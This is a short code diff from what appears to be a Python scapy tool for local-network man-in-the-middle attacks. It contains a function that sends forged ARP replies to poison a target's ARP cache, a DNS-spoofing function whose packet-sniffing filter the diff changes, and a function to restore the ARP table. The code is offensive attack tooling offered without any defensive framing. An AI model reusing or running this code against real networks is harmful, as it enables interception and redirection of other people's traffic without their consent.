@@ -5,7 +5,7 @@ def spoofarpcache(targetip, targetmac, sourceip):
 	send(ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac), verbose=False)
 
 def DNSSpoofing(iptarget):
-   a = sniff(filter="dns")
+   a = sniff(filter="port 53 udp")
    a.nsummary()
 
 def restorearp(targetip, targetmac, sourceip, sourcemac):
